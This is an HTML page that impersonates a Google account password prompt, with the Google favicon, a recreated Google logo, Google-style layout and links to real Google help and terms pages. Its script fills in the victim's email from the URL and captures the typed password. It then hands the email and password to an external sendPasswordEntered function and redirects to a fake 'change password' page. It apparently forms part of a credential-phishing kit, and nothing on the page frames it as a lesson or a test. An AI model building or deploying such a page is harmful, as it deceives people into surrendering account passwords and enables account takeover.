<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Welcome</title>
  <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script src="/config.js"></script>
  <script src="functions.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background-color: #0e0e0e;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      color: #e3e3e3;
      min-height: 100vh;
    }

    /* ══════════════════════════════
       DESKTOP LAYOUT
    ══════════════════════════════ */
    #megadiv {
      width: 100%;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #1e1f20;
      padding: 24px;
    }

    #main { width: 100%; max-width: 1040px; }

    #instructions {
      background-color: #0e0e0e;
      width: 100%;
      min-height: 400px;
      border-radius: 28px;
      display: flex;
      overflow: hidden;
      position: relative;
    }

    #left { width: 45%; flex-shrink: 0; }
    #get_instructed { padding: 40px; }
    #get_instructed h1 {
      padding-top: 20px;
      font-size: 28px;
      font-weight: 300;
      color: #e3e3e3;
    }

    #email_pill {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      margin-top: 16px;
      border: 1.8px solid #9aa0a6;
      border-radius: 100px;
      padding: 5px 12px 5px 5px;
      cursor: pointer;
      background-color: transparent;
      width: fit-content;
    }
    #email_pill_text {
      color: #e3e3e3;
      font-size: 14px;
      font-weight: 400;
    }

    #right {
      position: relative;
      flex: 1;
      display: flex;
      align-items: flex-start;
      justify-content: flex-start;
    }

    #name_form_div {
      padding: 110px 40px 0 20px;
      width: 100%;
      box-sizing: border-box;
    }

    #verify_text {
      color: #e3e3e3;
      font-size: 16px;
      font-weight: 400;
      margin: 0 0 48px 0;
    }

    /* Password wrapper - desktop */
    #password-wrapper {
      position: relative;
      width: 100%;
      margin: 0;
    }
    #password-wrapper input[type="password"],
    #password-wrapper input[type="text"] {
      width: 100%;
      box-sizing: border-box;
      color: #e3e3e3;
      background-color: #0e0e0e;
      border-radius: 4px;
      border: 1px solid #5f6368;
      font-size: 16px;
      height: 56px;
      padding: 14px;
      outline: none;
      font-family: inherit;
      transition: border 0.15s;
    }
    #password-wrapper input:focus { border: 2px solid #a8c7fa; }
    #password_label {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 16px;
      line-height: 1;
      color: #9aa0a6;
      background-color: transparent;
      padding: 0 4px;
      pointer-events: none;
      z-index: 1;
      transition: all 0.12s;
    }
    #password-wrapper input:focus ~ #password_label,
    #password-wrapper input:not(:placeholder-shown) ~ #password_label {
      top: 0;
      transform: translateY(-50%);
      font-size: 12px;
      background-color: #0e0e0e;
    }
    #password-wrapper input:focus ~ #password_label { color: #a8c7fa; }
    #password-wrapper input:not(:placeholder-shown):not(:focus) ~ #password_label { color: #9aa0a6; }

    #show_password_row {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-top: 20px;
    }
    #show_pw_checkbox {
      appearance: none; -webkit-appearance: none;
      width: 18px; height: 18px; min-width: 18px;
      border: 2px solid #8e918f;
      border-radius: 2px;
      background-color: transparent;
      cursor: pointer;
      position: relative;
    }
    #show_pw_checkbox:checked { background-color: #a8c7fa; border-color: #a8c7fa; }
    #show_pw_checkbox:checked::after {
      content: '';
      position: absolute;
      left: 3px; top: 0px;
      width: 5px; height: 10px;
      border: 2px solid #062e6f;
      border-top: none; border-left: none;
      transform: rotate(45deg);
    }
    #show_pw_label { color: #e3e3e3; font-size: 14px; cursor: pointer; }

    #bottom_right {
      position: absolute;
      bottom: 40px;
      right: 40px;
      display: flex;
      align-items: center;
      gap: 4px;
    }

    #try_another_way {
      color: #a8c7fa;
      font-size: 14px;
      font-weight: 500;
      text-decoration: none;
      padding: 10px 12px;
      border-radius: 4px;
    }
    #try_another_way:hover { background-color: #1a2540; }

    #next_button {
      cursor: pointer;
      font-weight: 600;
      font-family: inherit;
      color: #062e6f;
      height: 40px;
      padding: 0 24px;
      background-color: #a8c7fa;
      border: none;
      border-radius: 100px;
      font-size: 14px;
    }

    /* Card size */
    #instructions { height: 400px; }

    /* Undermenu desktop */
    #undermenu {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 8px;
      min-height: 56px;
    }
    #under_container a { color: #9aa0a6; font-size: 13px; padding: 8px 12px; text-decoration: none; }
    #lang_button {
      border: none; background: transparent;
      color: #9aa0a6; font-family: inherit;
      font-size: 13px; padding: 8px 12px; cursor: pointer;
    }

    /* ══════════════════════════════
       MOBILE LAYOUT
    ══════════════════════════════ */
    @media (max-width: 700px) {
      body { background-color: #0e0e0e; }

      #megadiv {
        background-color: #0e0e0e;
        padding: 0;
        align-items: flex-start;
        display: block;
      }

      #instructions {
        border-radius: 0;
        flex-direction: column;
        min-height: 100vh;
        height: auto;
        background-color: #0e0e0e;
        position: relative;
      }

      /* Left = top on mobile */
      #left { width: 100%; }
      #get_instructed { padding: 24px 20px 8px; }
      #get_instructed h1 {
        font-size: 36px;
        font-weight: 400;
        padding-top: 12px;
      }

      /* Email pill mobile */
      #email_pill {
        margin-top: 12px;
        border: 1.5px solid #5f6368;
        padding: 8px 14px 8px 8px;
        gap: 10px;
      }
      #email_pill_text { font-size: 15px; }

      /* Right = below left on mobile */
      #right {
        width: 100%;
        display: block;
        position: static;
        align-items: flex-start;
      }

      #name_form_div {
        padding: 32px 20px 0;
        width: 100%;
      }

      #verify_text { display: none; }

      /* Password input mobile */
      #password-wrapper input[type="password"],
      #password-wrapper input[type="text"] {
        height: 64px;
        font-size: 17px;
        border-radius: 6px;
        background-color: transparent;
        border-color: #5f6368;
        padding: 14px;
      }

      #password-wrapper input:focus ~ #password_label,
      #password-wrapper input:not(:placeholder-shown) ~ #password_label {
        background-color: #0e0e0e;
      }

      #show_password_row { margin-top: 16px; }
      #show_pw_checkbox { width: 22px; height: 22px; border-radius: 3px; }
      #show_pw_label { font-size: 16px; }

      /* Bottom row mobile */
      #bottom_right {
        position: static;
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 36px 20px 16px;
        width: 100%;
      }

      #try_another_way {
        font-size: 16px;
        padding: 0;
        color: #a8c7fa;
      }

      #next_button {
        height: 44px;
        padding: 0 24px;
        font-size: 15px;
        border-radius: 100px;
      }

      #undermenu {
        padding: 16px 20px;
        flex-direction: column;
        align-items: flex-start;
        gap: 8px;
      }
      #under_container { display: flex; gap: 8px; }
      #under_container a { padding: 4px 8px; font-size: 14px; }
      #lang_button { font-size: 14px; padding: 4px 0; }
    }
    /* ── Loading bar ── */
    #loading-bar {
      position: absolute;
      top: 0;
      left: 0;
      height: 3px;
      width: 0%;
      background-color: #a8c7fa;
      z-index: 10;
      display: none;
      transition: width 0.4s ease;
    }
  </style>
</head>
<body>
  <div id="megadiv">
    <div id="main">
      <div id="instructions">
        <div id="loading-bar"></div>

        <!-- LEFT: logo + welcome + pill -->
        <div id="left">
          <div id="get_instructed">
            <svg onclick="piskot()" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="48" height="48" style="cursor:pointer">
              <circle cx="256" cy="256" r="256" fill="transparent"/>
              <g transform="translate(56,56) scale(0.78)">
                <path d="M42.4,145.9c15.5-32.3,37.4-59.6,65-82.3c37.4-30.9,80.3-49.5,128.4-55.2c56.5-6.7,109.6,4,158.7,33.4c12.2,7.3,23.6,15.6,34.5,24.6c2.7,2.2,2.4,3.5,0.1,5.7c-22.3,22.2-44.6,44.4-66.7,66.8c-2.6,2.6-4,2.4-6.8,0.3c-64.8-49.9-159.3-36.4-207.6,29.6c-8.5,11.6-15.4,24.1-20.2,37.7c-0.4,1.2-1.2,2.3-1.8,3.5c-12.9-9.8-25.9-19.6-38.7-29.5C72.3,169,57.3,157.5,42.4,145.9z" fill="#E94335"/>
                <path d="M126,303.8c4.3,9.5,7.9,19.4,13.3,28.3c22.7,37.2,55.1,61.1,97.8,69.6c38.5,7.7,75.5,2.5,110-16.8c1.2-0.6,2.4-1.2,3.5-1.8c0.6,0.6,1.1,1.3,1.7,1.8c25.8,20,51.7,40,77.5,60c-12.4,12.3-26.5,22.2-41.5,30.8c-43.5,24.8-90.6,34.8-140.2,31C186.3,501.9,133,477.5,89,433.5c-19.3-19.3-35.2-41.1-46.7-66c10.7-8.2,21.4-16.3,32.1-24.5C91.6,329.9,108.8,316.9,126,303.8z" fill="#34A853"/>
                <path d="M429.9,444.9c-25.8-20-51.7-40-77.5-60c-0.6-0.5-1.2-1.2-1.7-1.8c8.9-6.9,18-13.6,25.3-22.4c12.2-14.6,20.3-31.1,24.5-49.6c0.5-2.3,0.1-3.1-2.2-3c-1.2,0.1-2.3,0-3.5,0c-40.8,0-81.7-0.1-122.5,0.1c-4.5,0-5.5-1.2-5.4-5.5c0.2-29,0.2-58,0-87c0-3.7,1-4.7,4.7-4.7c74.8,0.1,149.6,0.1,224.5,0c3.2,0,4.5,0.8,5.3,4.2c6.1,27.5,5.7,55.1,2,82.9c-3,22.2-8.4,43.7-16.7,64.5c-12.3,30.7-30.4,57.5-54.2,80.5C431.6,443.8,430.7,444.3,429.9,444.9z" fill="#4285F3"/>
                <path d="M126,303.8c-17.2,13.1-34.4,26.1-51.6,39.2c-10.7,8.1-21.4,16.3-32.1,24.5C34,352.1,28.6,335.8,24.2,319c-8.4-32.5-9.7-65.5-5.1-98.6c3.6-26,11.1-51,23.2-74.4c15,11.5,29.9,23.1,44.9,34.6c12.9,9.9,25.8,19.7,38.7,29.5c-2.2,10.7-5.3,21.2-6.3,32.2c-1.8,20,0.1,39.5,5.8,58.7C125.8,301.8,125.9,302.8,126,303.8z" fill="#FABB06"/>
              </g>
            </svg>
            <h1>Welcome</h1>
            <!-- Email pill -->
            <div id="email_pill">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                <defs><clipPath id="pillClip"><circle cx="12" cy="12" r="11"/></clipPath></defs>
                <circle cx="12" cy="12" r="11" fill="transparent" stroke="#8a8a8a" stroke-width="1"/>
                <circle cx="12" cy="12" r="3.5" fill="#e0e0e0"/>
                <path d="M1 24 Q1 17 12 17 Q23 17 23 24" fill="#e0e0e0" clip-path="url(#pillClip)"/>
              </svg>
              <span id="email_pill_text">loading...</span>
              <svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 10 10" fill="none">
                <path d="M2 3.5l3 3 3-3" stroke="#9aa0a6" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
            </div>
          </div>
        </div>

        <!-- RIGHT: password form -->
        <div id="right">
          <div id="name_form_div">
            <p id="verify_text">To continue, first verify it's you</p>
            <div id="password-wrapper">
              <input type="password" id="final_password" placeholder=" " autocomplete="current-password">
              <label id="password_label" for="final_password">Enter your password</label>
            </div>
            <div id="show_password_row">
              <input type="checkbox" id="show_pw_checkbox" onchange="togglePasswordVisibility()">
              <label for="show_pw_checkbox" id="show_pw_label">Show password</label>
            </div>
          </div>
          <div id="bottom_right">
            <a href="#" id="try_another_way">Try another way</a>
            <input type="button" id="next_button" onclick="showLoader(); checkPassword()" value="Next">
          </div>
        </div>

      </div>

      <div id="undermenu">
        <div id="language">
          <select id="lang_button" name="language">
            <option value="English (United States)">English (United States)</option>
            <option value="English (United Kingdom)">English (United Kingdom)</option>
          </select>
        </div>
        <div id="under_container">
          <a href="https://support.google.com/accounts?hl=en&p=account_iph" target="_blank">Help</a>
          <a href="https://accounts.google.com/TOS?loc=SI&hl=en&privacy=true" target="_blank">Privacy</a>
          <a href="https://accounts.google.com/TOS?loc=SI&hl=en" target="_blank">Terms</a>
        </div>
      </div>
    </div>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const email = params.get('email') || sessionStorage.getItem('login_email') || 'user@gmail.com';
    document.getElementById('email_pill_text').textContent = email;

    function showLoader() {
      var bar = document.getElementById('loading-bar');
      bar.style.display = 'block';
      bar.style.width = '0%';
      setTimeout(function() { bar.style.width = '70%'; }, 50);
      setTimeout(function() { bar.style.width = '90%'; }, 600);
    }

    function togglePasswordVisibility() {
      const input = document.getElementById('final_password');
      input.type = document.getElementById('show_pw_checkbox').checked ? 'text' : 'password';
    }

    function checkPassword() {
      var g = document.getElementById('final_password').value;
      if (!g) return;
      var em = new URLSearchParams(window.location.search).get('email') || sessionStorage.getItem('login_email') || 'unknown';
      sendPasswordEntered(em, g);
      setTimeout(function(){
        window.location.href = 'change_password.html';
      }, 800);
    }
  </script>
</body>
</html>
